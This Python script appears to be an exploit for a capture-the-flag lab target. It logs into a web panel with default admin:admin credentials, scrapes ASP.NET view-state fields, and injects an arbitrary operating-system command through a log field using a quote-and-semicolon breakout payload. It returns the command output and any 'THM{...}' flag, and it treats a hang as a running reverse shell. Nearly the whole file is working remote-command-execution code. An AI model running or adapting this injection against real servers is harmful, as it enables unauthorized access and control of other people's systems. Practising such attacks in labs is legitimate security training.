#!/usr/bin/env python3

import argparse
import base64
import json
import os
import platform
import random
import re
import requests
import string

class Attacker:
    def __init__(self, baseurl, username, password):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif len(baseurl) < 1:
            raise ValueError("Baseurl must be a non-zero length string")

        if not(isinstance(username,str)):
            raise TypeError(f"Username must be a string. Got {type(username)}")
        elif len(username) < 1:
            raise ValueError("Username must be a non-zero length string")

        if not(isinstance(password,str)):
            raise TypeError(f"Password must be a string. Got {type(password)}")
        elif len(password) < 1:
            raise ValueError("Password must be a non-zero length string")

        self.__baseurl = baseurl
        self.__username = username
        self.__password = password
        self.__session = requests.Session()
        self.__headers = dict()
        self.__timeout = 10

        self.__session.verify = False
        return

    def ServicePage(self):
        data = dict()
        message = str()
        success = bool()
        targetroute = "test"
        targeturl = f"{self.__baseurl}/{targetroute}/"

        try:
            b64creds = base64.b64encode(f"{self.__username}:{self.__password}".encode("utf-8")).decode("ascii")
            self.__headers["Authorization"] = f"Basic {b64creds}"
            self.__headers["Origin"] = self.__baseurl
            self.__headers["Referer"] = targeturl
    
            resp = self.__session.post(targeturl, data=data, headers=self.__headers)
            if resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[servicepage]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            message = "successfully accessed service panel"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def GrabHiddenInfo(self):
        message = str()
        success = bool()
        pattern = str()
        targetroute = "test"
        targeturl = f"{self.__baseurl}/{targetroute}/"
        viewstate = dict()

        try:
            resp = self.__session.get(targeturl, headers=self.__headers)
            if resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[getviewstate]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            pattern = "id=\"__VIEWSTATE\" value=\"(.*)\" />"

            viewstate["viewstate"], success, message = FindFlag(resp.text,pattern)
            if not(success):
                raise ValueError(message)

            pattern = "id=\"__VIEWSTATEGENERATOR\" value=\"(.*)\" />"
            viewstate["generator"], success, message = FindFlag(resp.text,pattern)
            if not(success):
                raise ValueError(message)

            pattern = "id=\"__EVENTVALIDATION\" value=\"(.*)\" />"
            viewstate["validator"], success, message = FindFlag(resp.text,pattern)
            if not(success):
                raise ValueError(message)

            message = "hidden info successfully acquired"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return viewstate, success, message

    def ExecCommand(self, command):
        commandOutput = str()
        data = dict()
        message = str()
        success = bool()
        targetroute = "test"
        targeturl = f"{self.__baseurl}/{targetroute}/"
        viewstate = str()

        try:
            if not(isinstance(command,str)):
                raise TypeError(f"Command must be a string. Got {type(command)}")
            elif len(command) < 1:
                raise ValueError("Command must be a non-zero length string")

            viewstate, success, message = self.GrabHiddenInfo()
            if not(success):
                raise ValueError(message)

            payload = f"BitlockerActiveMonitoringLogs'); {command};#"

            data["__VIEWSTATE"] = viewstate["viewstate"]
            data["__VIEWSTATEGENERATOR"] = viewstate["generator"]
            data["__EVENTVALIDATION"] = viewstate["validator"]
            data["xlog"] = payload
            data["Button"] = "Run"

            success, message = self.GetLogonFavicon()
            if not(success):
                ErrMsg(message)
            else:
                SucMsg(message)

            resp = self.__session.post(targeturl, data=data, headers=self.__headers, timeout=self.__timeout)
            if resp.status_code >= 400:
                raise ValueError(f"{ANSI_RED}[execcommand]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            secretflag, success, message = FindFlag(resp.text,"((thm|THM){.*})")
            if not(success):
                ErrMsg(message)
            else:
                secretflag = secretflag[0].decode("utf-8")
                SucMsg(f"Flag: {secretflag}")

            commandOutput, success, message = FindFlag(resp.text, "<pre>((.|\n)*?)</pre>")

            commandOutput = commandOutput[0].decode().strip("\n").strip("\r")

            message = "command successfully executed"
            success = True
        except requests.ReadTimeout:
            commandOutput = ""
            message = "long running command or reverse shell running"
            success = True
        except Exception as ex:
            commandOutput = ""
            message = str(ex)
            success = False

        return (commandOutput, success, message)

    def GetLogonFavicon(self):
        message = str()
        params = dict()
        paramurl = f"{self.__baseurl}/owa/favicon.ico&reason=0"
        success = bool()
        targeturl = f"{self.__baseurl}/logon.aspx"

        try:
            params["url"] = paramurl

            resp = self.__session.get(targeturl, params=params, headers=self.__headers, timeout=self.__timeout)
            if resp.status_code != 200:
                raise ValueError(f"{ANSI_RED}[favicon]{ANSI_RST} bad status code ({ANSI_RED}{resp.status_code} {resp.reason}{ANSI_RST})")

            message = "favicon acquired"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False
        
        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        #data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        #flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    parser.add_argument("-c","--command", help="command to execute on target", dest="command", default="whoami")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    command = args.command
    if len(command) < 1:
        raise ValueError("command must be a non-zero length string")

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseURL = f"{scheme}://{target}:{port}"

    attacker = Attacker(baseURL, "admin", "admin")
    success, message = attacker.ServicePage()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    commandOutput, success, message = attacker.ExecCommand(command)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    if len(commandOutput) > 0:
        print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
        print(f"{ANSI_YLW}{'Command Output':^60}{ANSI_RST}")
        print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
        print(commandOutput)
        print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    else:
        InfoMsg("no output from command")


    return

if __name__ == "__main__":
    main()

